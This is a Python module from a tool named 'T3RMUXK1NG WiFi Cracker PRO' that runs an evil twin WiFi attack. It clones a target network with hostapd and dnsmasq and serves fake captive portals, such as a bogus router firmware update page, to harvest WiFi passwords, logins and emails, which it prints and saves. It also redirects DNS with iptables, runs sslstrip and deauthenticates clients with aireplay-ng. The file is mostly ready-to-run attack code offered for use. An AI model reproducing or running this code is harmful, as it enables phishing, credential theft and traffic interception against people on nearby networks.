#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
T3RMUXK1NG WiFi Cracker PRO - Evil Twin Module
Rogue Access Point with captive portal and credential harvesting
"""

import os
import re
import time
import json
import subprocess
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import queue


@dataclass
class CaptiveCredential:
    """Captured credential from captive portal"""
    username: str
    password: str
    email: str = ""
    mac: str = ""
    timestamp: str = ""
    user_agent: str = ""
    ip: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'username': self.username,
            'password': self.password,
            'email': self.email,
            'mac': self.mac,
            'timestamp': self.timestamp or datetime.now().isoformat(),
            'user_agent': self.user_agent,
            'ip': self.ip
        }


class EvilTwin:
    """Evil Twin Attack Suite"""
    
    # Portal templates
    PORTAL_TEMPLATES = {
        'router_update': '''<!DOCTYPE html>
<html><head><title>Router Update Required</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f0f0;text-align:center;padding:50px;}
.container{background:white;padding:40px;border-radius:10px;max-width:400px;margin:0 auto;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
h1{color:#d32f2f;}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#1976d2;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
.warning{color:#d32f2f;font-size:14px;}</style>
</head><body><div class="container">
<h1>⚠️ Firmware Update Required</h1>
<p class="warning">Your router requires a critical security update. Please enter your WiFi password to continue.</p>
<form method="POST" action="/submit">
<input type="password" name="password" placeholder="WiFi Password" required>
<button type="submit">Update Now</button>
</form></div></body></html>''',
        
        'wifi_reconnect': '''<!DOCTYPE html>
<html><head><title>WiFi Connection</title>
<style>
body{font-family:Arial,sans-serif;background:#e8f5e9;text-align:center;padding:50px;}
.container{background:white;padding:40px;border-radius:10px;max-width:400px;margin:0 auto;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
h1{color:#388e3c;}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#4caf50;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
</style></head><body><div class="container">
<h1>📶 Reconnect to WiFi</h1>
<p>Your session has expired. Please reconnect.</p>
<form method="POST" action="/submit">
<input type="text" name="username" placeholder="Username or Email">
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>''',
        
        'terms': '''<!DOCTYPE html>
<html><head><title>Accept Terms</title>
<style>
body{font-family:Arial,sans-serif;background:#fff3e0;text-align:center;padding:50px;}
.container{background:white;padding:40px;border-radius:10px;max-width:500px;margin:0 auto;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
h1{color:#f57c00;}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#ff9800;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
</style></head><body><div class="container">
<h1>📋 Terms of Service</h1>
<p>By using this network, you agree to our terms. Please authenticate to continue.</p>
<form method="POST" action="/submit">
<input type="email" name="email" placeholder="Email Address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">I Agree & Connect</button>
</form></div></body></html>''',
    }
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.target = None
        self.ssid = ""
        self.channel = 1
        self.credentials: List[CaptiveCredential] = []
        self.credential_queue = queue.Queue()
        self.http_server = None
        self.dns_server = None
        self.dhcp_server = None
        self.hostapd_process = None
        self.running_processes = []
        
        self.config = {
            'ssid': '',
            'channel': '1',
            'gateway': '10.0.0.1',
            'dhcp_range': '10.0.0.2,10.0.0.100',
            'portal_type': 'router_update',
            'ssl': False,
            'log_file': '/tmp/evil_twin.log'
        }
    
    def start(self, target, attack_type: str = "portal") -> bool:
        """Start Evil Twin attack"""
        self.target = target
        self.ssid = target.essid if hasattr(target, 'essid') else str(target)
        self.channel = getattr(target, 'channel', 1)
        self.running = True
        
        # Stop NetworkManager
        self._stop_network_manager()
        
        # Configure interface
        self._configure_interface()
        
        # Start based on attack type
        if attack_type == "open":
            return self._start_open_ap()
        elif attack_type == "wpa2":
            return self._start_wpa2_ap()
        elif attack_type == "portal":
            return self._start_captive_portal()
        elif attack_type == "dns":
            return self._start_dns_spoof()
        elif attack_type == "sslstrip":
            return self._start_sslstrip()
        elif attack_type == "full":
            return self._start_full_suite()
        
        return False
    
    def _stop_network_manager(self):
        """Stop NetworkManager to avoid conflicts"""
        try:
            subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'],
                         capture_output=True)
            subprocess.run(['sudo', 'pkill', 'wpa_supplicant'],
                         capture_output=True)
        except:
            pass
    
    def _configure_interface(self):
        """Configure network interface"""
        gateway = self.config['gateway']
        
        try:
            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', self.interface],
                         capture_output=True)
            subprocess.run(['sudo', 'ip', 'addr', 'add', f'{gateway}/24', 
                          'dev', self.interface],
                         capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'],
                         capture_output=True)
        except:
            pass
    
    def _start_open_ap(self) -> bool:
        """Start open Access Point"""
        config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
channel={self.channel}
hw_mode=g
"""

        config_file = '/tmp/hostapd.conf'
        with open(config_file, 'w') as f:
            f.write(config)
        
        try:
            self.hostapd_process = subprocess.Popen(
                ['sudo', 'hostapd', config_file],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.running_processes.append(self.hostapd_process)
            return True
        except:
            return False
    
    def _start_wpa2_ap(self) -> bool:
        """Start WPA2 Access Point (need to know password)"""
        # This would require knowing the actual password
        # For credential harvesting, use open + captive portal instead
        return self._start_open_ap()
    
    def _start_captive_portal(self) -> bool:
        """Start captive portal"""
        # Start AP
        if not self._start_open_ap():
            return False
        
        # Start DHCP
        self._start_dhcp()
        
        # Start DNS
        self._start_dns()
        
        # Start HTTP server
        self._start_http_server()
        
        return True
    
    def _start_dhcp(self):
        """Start DHCP server"""
        config = f"""interface={self.interface}
dhcp-range={self.config['dhcp_range']}
dhcp-option=3,{self.config['gateway']}
dhcp-option=6,{self.config['gateway']}
"""

        config_file = '/tmp/dnsmasq.conf'
        with open(config_file, 'w') as f:
            f.write(config)
        
        try:
            process = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', config_file, '-d'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.running_processes.append(process)
            self.dhcp_server = process
        except:
            pass
    
    def _start_dns(self):
        """Start DNS server (redirect all to our IP)"""
        # dnsmasq handles DNS redirection
        pass
    
    def _start_http_server(self):
        """Start HTTP server for captive portal"""
        portal_type = self.config['portal_type']
        portal_html = self.PORTAL_TEMPLATES.get(portal_type, self.PORTAL_TEMPLATES['router_update'])
        
        credentials = self.credentials
        cred_queue = self.credential_queue
        
        class PortalHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress logging
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(portal_html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode()
                
                # Parse form data
                data = {}
                for pair in body.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[key] = value.replace('+', ' ')
                
                cred = CaptiveCredential(
                    username=data.get('username', ''),
                    password=data.get('password', ''),
                    email=data.get('email', ''),
                    mac=self.client_address[0],
                    ip=self.client_address[0],
                    user_agent=self.headers.get('User-Agent', '')
                )
                
                credentials.append(cred)
                cred_queue.put(cred)
                
                # Redirect to success page
                self.send_response(302)
                self.send_header('Location', '/success')
                self.end_headers()
        
        def run_server():
            server = HTTPServer(('0.0.0.0', 80), PortalHandler)
            self.http_server = server
            server.serve_forever()
        
        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()
    
    def _start_dns_spoof(self) -> bool:
        """Start DNS spoofing"""
        # Use dnsmasq for DNS spoofing
        if not self._start_captive_portal():
            return False
        
        # Configure iptables for DNS redirection
        gateway = self.config['gateway']
        
        iptables_rules = [
            f'iptables -t nat -A PREROUTING -i {self.interface} -p udp --dport 53 -j DNAT --to {gateway}:53',
            f'iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 53 -j DNAT --to {gateway}:53',
        ]
        
        for rule in iptables_rules:
            try:
                subprocess.run(f'sudo {rule}', shell=True, capture_output=True)
            except:
                pass
        
        return True
    
    def _start_sslstrip(self) -> bool:
        """Start SSL stripping"""
        if not self._start_captive_portal():
            return False
        
        # Configure iptables for SSL strip
        try:
            subprocess.run(
                f'sudo iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 -j REDIRECT --to-port 8080',
                shell=True, capture_output=True
            )
            
            process = subprocess.Popen(
                ['sslstrip', '-l', '8080'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.running_processes.append(process)
            
            return True
        except:
            return False
    
    def _start_full_suite(self) -> bool:
        """Start all attacks"""
        return self._start_captive_portal() and self._start_sslstrip()
    
    def get_credentials(self) -> Optional[CaptiveCredential]:
        """Get captured credential (non-blocking)"""
        try:
            return self.credential_queue.get_nowait()
        except queue.Empty:
            return None
    
    def get_all_credentials(self) -> List[CaptiveCredential]:
        """Get all captured credentials"""
        return self.credentials.copy()
    
    def deauth_target(self, bssid: str, count: int = 10):
        """Deauth clients from target AP"""
        try:
            # Get monitor interface
            mon_interface = f"{self.interface}mon"
            
            subprocess.run(
                ['sudo', 'aireplay-ng', '--deauth', str(count),
                 '-a', bssid, mon_interface or self.interface],
                capture_output=True
            )
        except:
            pass
    
    def stop(self):
        """Stop Evil Twin"""
        self.running = False
        
        # Stop HTTP server
        if self.http_server:
            self.http_server.shutdown()
        
        # Stop all processes
        for process in self.running_processes:
            try:
                process.terminate()
            except:
                pass
        
        # Clean up iptables
        subprocess.run('sudo iptables -F', shell=True, capture_output=True)
        subprocess.run('sudo iptables -t nat -F', shell=True, capture_output=True)
        
        # Remove config files
        for f in ['/tmp/hostapd.conf', '/tmp/dnsmasq.conf']:
            try:
                os.remove(f)
            except:
                pass
        
        # Restart NetworkManager
        try:
            subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'],
                         capture_output=True)
        except:
            pass
    
    def save_credentials(self, output_file: str):
        """Save captured credentials"""
        data = [c.to_dict() for c in self.credentials]
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python evil_twin.py <interface> <ssid> [portal_type]")
        sys.exit(1)
    
    interface = sys.argv[1]
    ssid = sys.argv[2]
    portal_type = sys.argv[3] if len(sys.argv) > 3 else 'router_update'
    
    # Create target
    class Target:
        def __init__(self, ssid):
            self.essid = ssid
            self.channel = 1
    
    target = Target(ssid)
    
    evil_twin = EvilTwin(interface)
    evil_twin.config['portal_type'] = portal_type
    
    print(f"Starting Evil Twin: {ssid}")
    evil_twin.start(target, 'portal')
    
    print("Evil Twin running. Press Ctrl+C to stop.")
    print("Captured credentials:")
    
    try:
        while True:
            cred = evil_twin.get_credentials()
            if cred:
                print(f"  {cred.username}: {cred.password}")
            time.sleep(1)
    except KeyboardInterrupt:
        evil_twin.stop()
        print("\nEvil Twin stopped")
